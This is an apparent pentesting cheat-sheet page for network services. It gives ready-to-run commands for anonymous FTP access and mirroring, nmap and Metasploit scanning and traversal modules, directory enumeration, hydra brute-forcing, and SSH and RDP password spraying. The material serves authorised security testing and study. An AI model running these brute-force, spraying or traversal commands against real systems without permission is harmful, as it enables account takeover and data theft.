---
layout: notes
permalink: /notes/network/services/
title: Network Services Pentesting Cheat Sheet
---



# Network Services Pentesting Cheat Sheet
<details>
<summary>FTP (21)</summary>
<pre><code class="language-bash">#Login
ftp IP #optional port
lftp IP
anonymous:anonymous

#Commands
cd
ls -a # List all files (even hidden)
put filename #Upload file
get filename #Download file
mput/mget #Upload/Downlaod multiple files
quit

#Download all files
wget -m ftp://anonymous:anonymous@10.10.10.98
wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98
wget -r --user="USERNAME" --password="PASSWORD" ftp://server.com/ #If your user/password has special characters

#nmap
nmap --script ftp-* -p 21 IP

#metasploit
use auxiliary/scanner/ftp/anonymous
use auxiliary/scanner/ftp/ftp_login
use auxiliary/scanner/ftp/ftp_version
use auxiliary/scanner/ftp/ftp_bounce
use auxiliary/scanner/ftp/bison_ftp_traversal
use auxiliary/scanner/ftp/colorado_ftp_traversal
use auxiliary/scanner/ftp/titanftp_xcrc_traversal

#Enum dirs
gobuster dir -u ftp://IP -w wordlist

#Bruteforce
hydra -t 1 -l {Username} -P {Big_Passwordlist} -vV {IP} ftp
hydra -l ftp -P password.txt ftp://$ip 
hydra -L username.txt -P password.txt ftp://$ip
</code></pre>
</details>

<details>
<summary>SSH (22)</summary>
<pre><code class="language-bash">#Password spraying
hydra -L usernames-list.txt -p Spring2025 ssh://10.1.1.10
</code></pre>
</details>

<details>
<summary>SMB (139/445)</summary>
<pre><code class="language-bash">#metasploit bruteforce
use auxiliary/scanner/smb/smb_login 
</code></pre>
</details>

<details>
<summary>RDP (3389)</summary>
<pre><code class="language-bash">#Password spraying
git clone https://github.com/xFreed0m/RDPassSpray
#Options:
RDPassSpray.py [-h] (-U USERLIST | -u USER  -p PASSWORD | -P PASSWORDLIST) (-T TARGETLIST | -t TARGET) [-s SLEEP | -r minimum_sleep maximum_sleep] [-d DOMAIN] [-n NAMES] [-o OUTPUT] [-V]
#Usage:
python3 RDPassSpray.py -U users.txt -p Spring2025! -t 10.100.10.240:3389
</code></pre>
</details>